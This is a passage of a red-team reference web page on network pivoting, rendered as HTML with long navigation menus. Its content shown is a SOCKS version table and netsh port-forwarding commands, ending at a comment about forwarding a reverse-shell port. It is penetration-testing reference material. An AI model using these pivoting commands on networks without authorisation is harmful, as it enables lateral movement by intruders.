+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Redteam
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            Redteam
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_1" id="__nav_11_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Access
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_1">
+            <span class="md-nav__icon md-icon"></span>
+            Access
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/html-smuggling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTML Smuggling
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/initial-access/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Initial Access
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/office-attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Office - Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/phishing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Phishing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/web-attack-surface/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Attack Surface
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/windows-download-execute/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - Download and execute methods
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../access/windows-using-credentials/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - Using credentials
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_2" id="__nav_11_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Escalation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_2">
+            <span class="md-nav__icon md-icon"></span>
+            Escalation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../escalation/linux-privilege-escalation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux - Privilege Escalation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../escalation/windows-privilege-escalation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - Privilege Escalation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_3" id="__nav_11_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Evasion
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_3">
+            <span class="md-nav__icon md-icon"></span>
+            Evasion
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evasion/edr-bypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Endpoint Detection and Response
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evasion/elastic-edr/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Elastic EDR
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evasion/linux-evasion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux - Evasion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evasion/proxy-bypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Proxy Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evasion/windows-amsi-bypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - AMSI Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evasion/windows-defenses/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - Defenses
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evasion/windows-dpapi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - DPAPI
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_4" id="__nav_11_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Persistence
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_4">
+            <span class="md-nav__icon md-icon"></span>
+            Persistence
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../persistence/linux-persistence/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux - Persistence
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../persistence/rdp-persistence/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    RDP - Persistence
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../persistence/windows-persistence/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows - Persistence
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_11_5" id="__nav_11_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_11_5">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Network Pivoting Techniques
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Network Pivoting Techniques
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#socks-compatibility-table" class="md-nav__link">
+    <span class="md-ellipsis">
+      SOCKS Compatibility Table
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-netsh-port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows netsh Port Forwarding
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSH
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSH">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#socks-proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      SOCKS Proxy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#local-port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Local Port Forwarding
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Port Forwarding
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proxychains" class="md-nav__link">
+    <span class="md-ellipsis">
+      Proxychains
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#graftcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Graftcp
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-socks-regeorg" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web SOCKS - reGeorg
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-socks-pivotnacci" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web SOCKS - pivotnacci
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#empire" class="md-nav__link">
+    <span class="md-ellipsis">
+      Empire
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sshuttle" class="md-nav__link">
+    <span class="md-ellipsis">
+      sshuttle
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chisel" class="md-nav__link">
+    <span class="md-ellipsis">
+      chisel
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="chisel">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sharpchisel" class="md-nav__link">
+    <span class="md-ellipsis">
+      SharpChisel
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ligolo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ligolo
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ligolo-ng" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ligolo-ng
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Ligolo-ng">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#single-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Single Pivot
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#double-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Double Pivot
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#triple-etc-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Triple, etc. Pivot
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pivoting-to-individual-hosts-to-expose-internally-running-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pivoting to individual hosts to expose internally running services.
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gost" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gost
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rpivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Rpivot
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#revsocks" class="md-nav__link">
+    <span class="md-ellipsis">
+      revsocks
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#plink" class="md-nav__link">
+    <span class="md-ellipsis">
+      plink
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ngrok" class="md-nav__link">
+    <span class="md-ellipsis">
+      ngrok
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cloudflared" class="md-nav__link">
+    <span class="md-ellipsis">
+      cloudflared
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#capture-a-network-trace-with-builtin-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Capture a network trace with builtin tools
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basic-pivoting-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Pivoting Types
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Basic Pivoting Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#listen-listen" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listen - Listen
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#listen-connect" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listen - Connect
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#connect-connect" class="md-nav__link">
+    <span class="md-ellipsis">
+      Connect - Connect
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#socks-compatibility-table" class="md-nav__link">
+    <span class="md-ellipsis">
+      SOCKS Compatibility Table
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-netsh-port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows netsh Port Forwarding
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSH
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSH">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#socks-proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      SOCKS Proxy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#local-port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Local Port Forwarding
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remote-port-forwarding" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remote Port Forwarding
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proxychains" class="md-nav__link">
+    <span class="md-ellipsis">
+      Proxychains
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#graftcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Graftcp
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-socks-regeorg" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web SOCKS - reGeorg
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-socks-pivotnacci" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web SOCKS - pivotnacci
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Metasploit
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#empire" class="md-nav__link">
+    <span class="md-ellipsis">
+      Empire
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sshuttle" class="md-nav__link">
+    <span class="md-ellipsis">
+      sshuttle
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#chisel" class="md-nav__link">
+    <span class="md-ellipsis">
+      chisel
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="chisel">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sharpchisel" class="md-nav__link">
+    <span class="md-ellipsis">
+      SharpChisel
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ligolo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ligolo
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ligolo-ng" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ligolo-ng
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Ligolo-ng">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#single-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Single Pivot
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#double-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Double Pivot
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#triple-etc-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Triple, etc. Pivot
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pivoting-to-individual-hosts-to-expose-internally-running-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pivoting to individual hosts to expose internally running services.
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gost" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gost
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rpivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Rpivot
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#revsocks" class="md-nav__link">
+    <span class="md-ellipsis">
+      revsocks
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#plink" class="md-nav__link">
+    <span class="md-ellipsis">
+      plink
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ngrok" class="md-nav__link">
+    <span class="md-ellipsis">
+      ngrok
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cloudflared" class="md-nav__link">
+    <span class="md-ellipsis">
+      cloudflared
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#capture-a-network-trace-with-builtin-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Capture a network trace with builtin tools
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basic-pivoting-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Pivoting Types
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Basic Pivoting Types">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#listen-listen" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listen - Listen
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#listen-connect" class="md-nav__link">
+    <span class="md-ellipsis">
+      Listen - Connect
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#connect-connect" class="md-nav__link">
+    <span class="md-ellipsis">
+      Connect - Connect
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+	
+                  
+
+
+  
+    <a href="https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/pivoting/network-pivoting-techniques.md" title="Edit this page" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+    
+      
+    
+    <a href="https://github.com/swisskyrepo/InternalAllTheThings/raw/main/docs/redteam/pivoting/network-pivoting-techniques.md" title="View source of this page" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="network-pivoting-techniques">Network Pivoting Techniques</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#socks-compatibility-table">SOCKS Compatibility Table</a></li>
+<li><a href="#windows-netsh-port-forwarding">Windows netsh Port Forwarding</a></li>
+<li><a href="#ssh">SSH</a></li>
+<li><a href="#socks-proxy">SOCKS Proxy</a></li>
+<li><a href="#local-port-forwarding">Local Port Forwarding</a></li>
+<li><a href="#remote-port-forwarding">Remote Port Forwarding</a></li>
+<li><a href="#proxychains">Proxychains</a></li>
+<li><a href="#graftcp">Graftcp</a></li>
+<li><a href="#web-socks---regeorg">Web SOCKS - reGeorg</a></li>
+<li><a href="#web-socks---pivotnacci">Web SOCKS - pivotnacci</a></li>
+<li><a href="#metasploit">Metasploit</a></li>
+<li><a href="#sshuttle">sshuttle</a></li>
+<li><a href="#chisel">chisel</a></li>
+<li><a href="#sharpchisel">SharpChisel</a></li>
+<li><a href="#gost">gost</a></li>
+<li><a href="#rpivot">Rpivot</a></li>
+<li><a href="#revsocks">RevSocks</a></li>
+<li><a href="#plink">plink</a></li>
+<li><a href="#ngrok">ngrok</a></li>
+<li><a href="#capture-a-network-trace-with-builtin-tools">Capture a network trace with builtin tools</a></li>
+<li><a href="#basic-pivoting-types">Basic Pivoting Types</a></li>
+<li><a href="#listen---listen">Listen - Listen</a></li>
+<li><a href="#listen---connect">Listen - Connect</a></li>
+<li><a href="#connect---connect">Connect - Connect</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<h2 id="socks-compatibility-table">SOCKS Compatibility Table</h2>
+<table>
+<thead>
+<tr>
+<th>SOCKS Version</th>
+<th style="text-align: center;">TCP</th>
+<th style="text-align: center;">UDP</th>
+<th style="text-align: center;">IPv4</th>
+<th style="text-align: center;">IPv6</th>
+<th style="text-align: center;">Hostname</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SOCKS v4</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">❌</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">❌</td>
+<td style="text-align: center;">❌</td>
+</tr>
+<tr>
+<td>SOCKS v4a</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">❌</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">❌</td>
+<td style="text-align: center;">✅</td>
+</tr>
+<tr>
+<td>SOCKS v5</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: center;">✅</td>
+</tr>
+</tbody>
+</table>
+<h2 id="windows-netsh-port-forwarding">Windows netsh Port Forwarding</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">netsh</span> <span class="n">interface</span> <span class="n">portproxy</span> <span class="n">add</span> <span class="n">v4tov4</span> <span class="n">listenaddress</span><span class="p">=</span><span class="n">localaddress</span> <span class="n">listenport</span><span class="p">=</span><span class="n">localport</span> <span class="n">connectaddress</span><span class="p">=</span><span class="n">destaddress</span> <span class="n">connectport</span><span class="p">=</span><span class="n">destport</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">netsh</span> <span class="n">interface</span> <span class="n">portproxy</span> <span class="n">add</span> <span class="n">v4tov4</span> <span class="n">listenport</span><span class="p">=</span><span class="n">3340</span> <span class="n">listenaddress</span><span class="p">=</span><span class="n">10</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">110</span> <span class="n">connectport</span><span class="p">=</span><span class="n">3389</span> <span class="n">connectaddress</span><span class="p">=</span><span class="n">10</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">110</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c"># Forward the port 4545 for the reverse shell, and the 80 for the http server for example</span>
